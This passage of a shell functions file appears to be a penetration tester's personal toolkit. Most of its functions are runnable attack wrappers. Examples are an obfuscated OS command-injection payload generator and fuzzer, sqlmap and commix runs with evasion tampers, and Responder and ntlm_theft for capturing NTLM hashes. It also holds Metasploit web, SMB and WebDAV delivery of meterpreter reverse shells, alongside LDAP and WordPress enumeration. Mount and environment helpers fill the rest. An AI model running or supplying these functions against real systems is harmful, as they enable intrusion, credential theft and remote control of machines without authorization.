        sudo mv /tmp/krb5conf /etc/krb5.conf
    fi
}


# AD Host Mapping generator
genhosts(){
    echo -e "\nFINDING AND MAPPING AD HOSTNAMES IN \"$1\"\n"
    nxc smb $1 --generate-hosts-file /tmp/hostsfile
    while read line; do
        grep -qxF $line /etc/hosts || echo $line | sudo tee --append /etc/hosts
    done < /tmp/hostsfile
    rm /tmp/hostsfile
}

# SQLMap Scan Wrapper
sqlscan(){ 
    echo -e "\nSCANNING REQUEST \"$1\" FOR SQL INJECTION WITH ALL METHODS\n"
    echo -e "----------------------------------"
    cat $1
    echo -e "----------------------------------"
    sqlmap -r $1 --level 5 --risk 3 --dbs --threads=10 --technique=BESQUT --random-agent --batch --fingerprint --parse-errors --banner --flush-session --fresh-queries --tamper=between,space2comment,equaltolike,escapequotes -v 2
}

ssp(){
    echo -e "\nSEARCHING EXPLOITDB / MSF MODULES\n"
    searchsploit $1 -j | jq '.RESULTS_EXPLOIT[] | select(.Verified == "1") | {Title, Date_Published, Date_Updated, Path}'

    echo -e "\nCVEMAP POC SEARCH\n"
    cvemap -auth && cvemap -silent -q "$1" -j | jq '.[] | select(.is_poc == true) | {cve_id, cve_description, pocs: [.poc[].url]}'
}

# Add/Extend Host Mappings of /etc/hosts
addhost() {
    ip="$1"
    hostname="$2"
    if grep -q "^$ip" /etc/hosts; then
      sudo sed -i "/^$ip/s/$/ $hostname/" /etc/hosts
      echo "[+] Appended $hostname to existing entry for $ip in /etc/hosts"
    else
      echo "$ip $hostname" | sudo tee -a /etc/hosts > /dev/null
      echo "[+] Added new entry: $ip $hostname to /etc/hosts"
    fi

    grep "^$ip" /etc/hosts
}

collab(){
    interactsh-client -up && interactsh-client -auth
    interactsh-client
}

# Endpoints Generation
urlgen(){
    cewl $1 -d 3 -m 3 --lowercase -w /tmp/endpoints_$(echo $1 | unfurl format %d).txt
}

alias bashfuscator='source ~/TOOLS/bashfuscator-env/bin/activate && bashfuscator'


# OS Injection Request Scanner
osscan(){
    rm ./os_injection.txt
    read -r cmd\?"INPUT COMMAND TO EXECUTE: "
    read -r regex\?"INPUT RESPONSE CONFIRMATION STRING (BLANK IF BLIND): "

    bin=$(echo "$cmd" | awk '{print $1}')
    echo "rev" | sed 's/./&$()/1' >> /tmp/rev_mangle.txt
    echo "rev" | sed 's/./&$@/1' >> /tmp/rev_mangle.txt
    echo "rev" | sed "s/./&\'\'/1" >> /tmp/rev_mangle.txt
    echo "rev" | sed "s/./&\"\"/1" >> /tmp/rev_mangle.txt

    while read rev; do
        revstr="$rev<<<'$(echo "$cmd" | rev)'"
        echo "\$($revstr)" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
        echo "\`$revstr\`" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
    done < /tmp/rev_mangle.txt
    rm /tmp/rev_mangle.txt

    echo "xxd" | sed 's/./&$()/1' >> /tmp/xxd_mangle.txt
    echo "xxd" | sed 's/./&$@/1' >> /tmp/xxd_mangle.txt
    echo "xxd" | sed "s/./&\'\'/1" >> /tmp/xxd_mangle.txt
    echo "xxd" | sed "s/./&\"\"/1" >> /tmp/xxd_mangle.txt
    echo "\$(rev<<<xxd)" >> /tmp/xxd_mangle.txt
    while read xxd; do
        echo "\$($xxd -r -ps<<<$(echo -n "$cmd" | hexdump -ve '/1 "%02x"'))" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
        echo "\`$xxd -r -ps<<<$(echo -n "$cmd" | hexdump -ve '/1 "%02x"')\`" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
        echo "{$xxd,-r,-ps,<<<,$(echo -n "$cmd" | hexdump -ve '/1 "%02x"')}" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
    done < /tmp/xxd_mangle.txt
    rm /tmp/xxd_mangle.txt

    echo "$cmd" | sed 's/./&$()/1' >> /tmp/cmd_mangle.txt
    echo "$cmd" | sed 's/./&$@/1' >> /tmp/cmd_mangle.txt
    echo "$cmd" | sed "s/./&\'\'/1" >> /tmp/cmd_mangle.txt
    echo "$cmd" | sed "s/./&\"\"/1" >> /tmp/cmd_mangle.txt
    while read cmdp; do
        echo "$cmdp" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
        echo "\$($cmdp)" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
        echo "\`$cmdp\`" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
        echo "{$(echo $cmdp | sed -e "s/ /,/g")}" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
    done < /tmp/cmd_mangle.txt
    rm /tmp/cmd_mangle.txt

    while read sp; do
        cat ~/WORDLISTS/OS_INJECTION/payloads.txt | sed "s/ /$sp/g" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
    done < ~/WORDLISTS/OS_INJECTION/spaces.txt
    cat ~/WORDLISTS/OS_INJECTION/payloads.txt | sed -e "s/\//\$\{PATH:0:1\}/g" >> ~/WORDLISTS/OS_INJECTION/payloads.txt

    while read sp; do
        while read sep; do
            while read payload; do
                echo "$sp$sep$sp$payload" >> os_injection.txt
                echo "$sp$sep$sp$payload$sp#" >> os_injection.txt
            done < ~/WORDLISTS/OS_INJECTION/payloads.txt
        done < ~/WORDLISTS/OS_INJECTION/separators.txt
    done < ~/WORDLISTS/OS_INJECTION/spaces.txt
    rm ~/WORDLISTS/OS_INJECTION/payloads.txt
    
    cat os_injection.txt | sort -u | shuf >t; mv t os_injection.txt
    if [[ ! -z $regex ]]; then
        echo -e "\nFUZZING REQUEST \"$1\" AND MATCHING RESPONSE FOR \"$regex\""
        ffuf -r -request $1 --request-proto http -w os_injection.txt -s -mr $regex
    else
        echo -e "\nFUZZING REQUEST \"$1\""
        ffuf -r -request $1 --request-proto http -w os_injection.txt -s
    fi

    echo -e "\nTESTING REQUEST \"$1\" FOR OS INJECTION USING COMMIX"
    cur=$(pwd)
    cd ~/TOOLS/commix
    python3 commix.py --update
    python3 commix.py -r $cur/$1 --flush-session --mobile --purge --current-user --level=3 --tamper=backslashes,backticks,base64encode,caret,dollaratsigns,doublequotes,multiplespaces,nested,printf2echo,randomcase,rev,singlequotes,slash2env,sleep2timeout,sleep2usleep,space2htab,space2ifs,space2plus,space2vtab
    cd $cur
}


# Quick python venv spawner
pyenv(){
    echo -e "\nSPAWNING VIRTUAL PYTHON3 ENVIRONMENT\n"
    python3 -m venv venv
    source venv/bin/activate
    if [[ -f ./requirements.txt ]]; then
        python3 -m pip install -r requirements.txt
    fi
    which python3
    pwd
}

#Responder Server
respond(){
    chnic
    sudo responder -I $inter -wd
}

# LLMNR File Generator
ntlmtheft(){
    cd /home/damuna/TOOLS/ntlm_theft
    python3 ntlm_theft.py -g all -s $1 -f NTDOCS
}

wordscan(){
    wpscan --api-token $wp_scan_api --url $1 --enumerate u,vp,vt,cb,dbe --rua --disable-tls-checks --no-banner -t 20
}

# Ldap domain dump
ldapdump(){
    if [ $# -lt 3 ]; then
        echo "Usage: ldapdump <DOMAIN\\user> <password> <ip>"
        return 1
    fi
    
    local domain_user="$1"
    local password="$2"
    local ip="$3"
    
    # Handle empty password case for anonymous authentication
    if [ -z "$password" ]; then
        ldapdomaindump -u "$domain_user" -o . "$ip"
    else
        ldapdomaindump -u "$domain_user" -p "$password" -o . "$ip"
    fi
    
    echo "Extracting usernames and saving them in ~/machines/user.txt"
    cat domain_users.json | grep -i samaccountname -A1 | grep -vi samaccountname | grep -v - | tr -d '>' | sort -u > ~/machines/user.txt
    
    echo -e "\n[*] Info and Descriptions:"
    cat domain_users.json | grep -Ei 'info|description' -A1
}

# PFX Certificate & Key extraction
pfx2key(){
    filename=$(echo $1)
    echo "pfx2key <pfx_file>\n"
    openssl pkcs12 -in $1 -clcerts -nokeys -out "${filename%.*}.crt"
    openssl pkcs12 -in $1 -nocerts -out /tmp/out.enc
    openssl rsa -in /tmp/out.enc -out "${filename%.*}.key"; rm /tmp/out.enc
    echo "\n SAVED ${filename%.*}.key and ${filename%.*}.crt"
}
    
# Meterpreter Upgrade Windows Generator
meterup(){
    chnic
    read -r os\?"SELECT OS (win32 / win64 / lin32 / lin64): "
    if [[ $os =~ "win" ]]; then
        read -r mtd\?"SELECT DELIVERY METHOD (smb, http, webdav): "
    fi

    pl=""
    if [[ $os =~ "lin" ]]; then
        if [[ $os == "lin32" ]]; then
            pl="/x86/"
        fi
        if [[ $os == "lin64" ]]; then
            pl="/x64/"
        fi
        sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload linux${pl}meterpreter/reverse_tcp; set target 7; set LHOST $nic; set SRVHOST $nic; run"
    fi

    if [[ $os =~ "win" ]]; then
        if [[ $os == "win32" ]]; then
            pl="/"
        fi

        if [[ $os == "win64" ]]; then
            pl="/x64/"
        fi

        if [[ $mtd == "smb" ]]; then
            sudo msfconsole -q -x "use exploit/windows/smb/smb_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LHOST $nic; set SRVHOST $nic; run"
        fi

        if [[ $mtd == "http" ]]; then
            sudo msfconsole -q -x "use exploit/multi/script/web_delivery; set payload windows${pl}meterpreter/reverse_tcp; set target 2; set LHOST $nic; set SRVHOST $nic; run"
        fi

        if [[ $mtd == "webdav" ]]; then
            sudo msfconsole -q -x "use exploit/windows/misc/webdav_delivery; set payload windows${pl}meterpreter/reverse_tcp; set LHOST $nic; set SRVHOST $nic; run"
        fi
    fi
}

# vhd vmsk vhdx Mounter
vhdMount() {
    if [[ $# -eq 0 ]]; then
        echo "Usage: vhdMount <File>"
        echo "To unmount: vhdMount -u"
        return 1
    fi

    # Unmount if -u flag is passed
    if [[ "$1" == "-u" ]]; then
        echo "Unmounting VHD..."
        sudo umount /mnt/my_vhs 2>/dev/null
        sudo vgchange -an 2>/dev/null
        sudo kpartx -d /dev/nbd0 2>/dev/null
        sudo qemu-nbd -d /dev/nbd0 2>/dev/null
        sudo rmmod nbd 2>/dev/null
        sudo rm -f /var/lock/qemu-nbd-nbd0 2>/dev/null
        echo "Unmount complete"
        return 0
    fi

    # Mounting procedure
    echo "Mounting VHD: $1"
    
    # Cleanup any existing mounts first
    sudo umount /mnt/my_vhs 2>/dev/null
    sudo vgchange -an 2>/dev/null
    sudo kpartx -d /dev/nbd0 2>/dev/null
    sudo qemu-nbd -d /dev/nbd0 2>/dev/null
    sudo rmmod nbd 2>/dev/null
    sudo rm -f /var/lock/qemu-nbd-nbd0 2>/dev/null
    
    # Setup new mount
    sudo mkdir -p /mnt/my_vhs
    sudo modprobe nbd max_part=16
    
    # Connect to NBD device
    if ! sudo qemu-nbd -r --connect=/dev/nbd0 "$1"; then
        echo "Failed to connect to NBD device"
        echo "Trying alternative approach..."
        sudo qemu-nbd -r -c /dev/nbd0 "$1" || {
            echo "Error: Could not connect $1 to /dev/nbd0"
            return 1
        }
    fi
    
    # Wait for device to be ready
    sleep 2
    
    # Check if device exists
    if [[ ! -b /dev/nbd0 ]]; then
        echo "Error: /dev/nbd0 block device not created"
        return 1
    fi
    
    # Create partition mappings
    if ! sudo kpartx -av /dev/nbd0; then
        echo "Error: Failed to create partition mappings"
        sudo qemu-nbd -d /dev/nbd0
        return 1
    fi
    
    # Wait for partitions to appear
    sleep 2
    
    # Try to mount the first partition automatically
    if [[ -b /dev/mapper/nbd0p1 ]]; then
        if sudo mount -t ntfs-3g /dev/mapper/nbd0p1 /mnt/my_vhs 2>/dev/null; then
            echo "Successfully mounted to /mnt/my_vhs"
            return 0
        else
            echo "Mount failed, trying alternative methods..."
            # Try mounting as read-only
            if sudo mount -t ntfs-3g -o ro /dev/mapper/nbd0p1 /mnt/my_vhs 2>/dev/null; then
                echo "Mounted as read-only to /mnt/my_vhs"
                return 0
            fi
        fi
    fi
    
    # If automatic mount failed
    echo "Could not automatically mount partition."
    echo "Available devices:"
    ls /dev/nbd0* /dev/mapper/nbd0* 2>/dev/null || echo "No devices found"
    
    echo "You can try mounting manually with:"
    echo "sudo mount -t ntfs-3g /dev/mapper/nbd0pX /mnt/my_vhs"
    echo "Or for read-only access:"
    echo "sudo mount -t ntfs-3g -o ro /dev/mapper/nbd0pX /mnt/my_vhs"
    return 1
}

# Bitlocker Mounting
bitmount(){
    if [[ $# -eq 0 ]]; then;
        echo -e "\nUsage: bitmount [FILE] [PWD]\n"
        return 1
    fi
    echo -e "\nCLEANING UP PREVIOUS DISKS\n"
    sudo rm -rf /media/bitlocker /media/bitlockermount
    for loop_device in $(losetup --all | grep "$1" | cut -d ':' -f 1)
    do
        echo "Detaching ${loop_device}..."
        sudo losetup -d "${loop_device}"
    done

    echo -e "\nMOUNTING \"$1\" WITH PASSWORD \"$2\"\n"
    sudo mkdir -p /media/bitlocker; sudo mkdir -p /media/bitlockermount
    sudo losetup -f -P $1
    disk=$(losetup --all | grep "$1" | awk '{print $1}' | head -n 1 | tr -d ':')
    sudo dislocker ${disk}p1 -u$2 -- /media/bitlocker
    sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount

    echo -e "\nCD AND LISTING CONTENT\n"
    cd /media/bitlockermount && sudo ls -la .
}


# SMB share mount
smbmount() {
    local ip="" user="" pass="" share=""
    
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -u|--user)
                user="$2"
                shift 2
                ;;
            -p|--pass)
                pass="$2"
                shift 2
                ;;
            *)
                if [[ -z "$ip" ]]; then
                    ip="$1"
                else
                    echo "Unknown argument: $1"
                    return 1
                fi
                shift
                ;;
        esac
    done

    # Check if IP is provided
    if [[ -z "$ip" ]]; then
        echo "Usage: smbmount <IP> -u <user> -p <pass>"
        return 1
    fi

    # Ask user to select a share
    vared -p "Select a share to mount: " -c share

    # Create mount point and mount
    local mount_point="/mnt/$share"
    sudo mkdir -p "$mount_point"
    sudo mount -t cifs "//$ip/$share" "$mount_point" -o username="$user",password="$pass"

    # Check if mount succeeded
    if mount | grep -q "$mount_point"; then
        echo "Successfully mounted //$ip/$share at $mount_point"
        cd $mount_point
    else
        echo "Failed to mount //$ip/$share"
        return 1
    fi
}
